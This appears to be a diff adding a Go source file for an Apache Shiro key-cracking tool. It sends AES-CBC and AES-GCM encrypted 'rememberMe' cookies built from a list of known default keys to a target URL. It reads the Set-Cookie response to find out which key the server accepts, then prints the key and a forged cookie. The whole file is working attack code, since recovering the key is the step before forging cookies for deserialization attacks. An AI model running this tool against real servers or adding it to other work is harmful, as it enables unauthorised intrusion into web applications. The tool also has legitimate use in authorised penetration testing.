@@ -1,0 +1,195 @@
+package shiro
+
+import (
+	"bytes"
+	"context"
+	"crypto/aes"
+	"crypto/cipher"
+	"crypto/rand"
+	"encoding/base64"
+	"fmt"
+	"io"
+	"strings"
+	"time"
+
+	uuid "github.com/satori/go.uuid"
+	"github.com/zan8in/retryablehttp"
+	"github.com/zan8in/shiro/pkg/req"
+)
+
+type Options struct {
+	Target     string
+	TargetFile string
+
+	ShiroKeysFile string
+
+	Proxy   string
+	Timeout int
+	Retries int
+}
+
+type Shiro struct {
+	shiroKeys    []string
+	checkContent string
+	shiroMethod  string
+	req          *req.Req
+}
+
+func NewShiro() (*Shiro, error) {
+	shiro := &Shiro{
+		shiroKeys:    ShiroKeys,
+		checkContent: CheckContent,
+		shiroMethod:  ShiroMethod,
+	}
+
+	return shiro, nil
+}
+
+func (s *Shiro) Run(options Options) (err error) {
+	s.req, err = req.New(&req.Options{
+		Proxy:   options.Proxy,
+		Timeout: options.Timeout,
+		Retries: options.Retries,
+	})
+	if err != nil {
+		return err
+	}
+
+	if len(options.Target) == 0 {
+		return fmt.Errorf("target is empty")
+	}
+
+	if !s.ShiroCheck(options.Target) {
+		ok, sk, rme := s.KeyCheck(options.Target)
+		fmt.Println(ok, sk, rme)
+	}
+
+	return nil
+}
+
+func (s *Shiro) RunMulti(options Options) error {
+	return nil
+}
+
+func (s *Shiro) ShiroCheck(TargetUrl string) bool {
+	ok, _ := s.HttpRequest("123", TargetUrl)
+	return ok
+}
+
+func (s *Shiro) KeyCheck(TargetUrl string) (bool, string, string) {
+	Content, _ := base64.StdEncoding.DecodeString(CheckContent)
+	var (
+		flag bool
+		sk   string
+		rme  string
+	)
+
+	for i := range ShiroKeys {
+		time.Sleep(time.Duration(0) * time.Second)
+		flag, sk, rme = s.FindTheKey(ShiroKeys[i], Content, TargetUrl)
+		if flag {
+			break
+		}
+	}
+	return flag, sk, rme
+}
+
+// return three result
+// 1. result boolean
+// 2. shirokey
+// 3. rememberMe
+func (s *Shiro) FindTheKey(ShiroKey string, Content []byte, TargetUrl string) (bool, string, string) {
+	key, _ := base64.StdEncoding.DecodeString(ShiroKey)
+	// result := "[-] Key incorrect "
+
+	var (
+		sk  string
+		rme string
+	)
+
+	RememberMe, err := AesCbcEncrypt(key, Content)
+	if err != nil {
+		return false, sk, rme
+	}
+	ok, _ := s.HttpRequest(RememberMe, TargetUrl)
+	if ok {
+		// result = "[+] CBC-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
+		sk = ShiroKey
+		rme = RememberMe
+	} else {
+		RememberMe, err = AesGcmEncrypt(key, Content)
+		if err != nil {
+			return false, sk, rme
+		}
+		ok, _ = s.HttpRequest(RememberMe, TargetUrl)
+		if ok {
+			// result = "[+] GCM-KEY:" + ShiroKey + "\n[+] rememberMe=" + RememberMe
+			sk = ShiroKey
+			rme = RememberMe
+		}
+	}
+
+	return ok, sk, rme
+}
+
+func Padding(plainText []byte, blockSize int) []byte {
+	n := blockSize - len(plainText)%blockSize
+	temp := bytes.Repeat([]byte{byte(n)}, n)
+	plainText = append(plainText, temp...)
+	return plainText
+}
+
+func AesCbcEncrypt(key []byte, Content []byte) (string, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+	Content = Padding(Content, block.BlockSize())
+	iv := uuid.NewV4().Bytes()
+	blockMode := cipher.NewCBCEncrypter(block, iv)
+	cipherText := make([]byte, len(Content))
+	blockMode.CryptBlocks(cipherText, Content)
+	return base64.StdEncoding.EncodeToString(append(iv[:], cipherText[:]...)), nil
+}
+
+func AesGcmEncrypt(key []byte, Content []byte) (string, error) {
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		return "", err
+	}
+	nonce := make([]byte, 16)
+	io.ReadFull(rand.Reader, nonce)
+	aesgcm, _ := cipher.NewGCMWithNonceSize(block, 16)
+	ciphertext := aesgcm.Seal(nil, nonce, Content, nil)
+	return base64.StdEncoding.EncodeToString(append(nonce, ciphertext...)), nil
+}
+
+func (s *Shiro) HttpRequest(RememberMe string, TargetUrl string) (bool, error) {
+	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(10)*time.Second)
+	defer cancel()
+
+	req, err := retryablehttp.NewRequestWithContext(ctx, strings.ToUpper(s.shiroMethod), TargetUrl, strings.NewReader(PostContent))
+	if err != nil {
+		return false, err
+	}
+
+	if strings.ToUpper(s.shiroMethod) == "POST" {
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+	}
+
+	req.Header.Set("User-Agent", UserAgent)
+	req.Header.Set("Cookie", "rememberMe="+RememberMe)
+
+	resp, err := s.req.Do(req)
+	if err != nil {
+		return false, err
+	}
+	defer resp.Body.Close()
+
+	var SetCookieAll string
+	for i := range resp.Header["Set-Cookie"] {
+		SetCookieAll += resp.Header["Set-Cookie"][i]
+	}
+	return !strings.Contains(SetCookieAll, "rememberMe=deleteMe;"), nil
+
+}
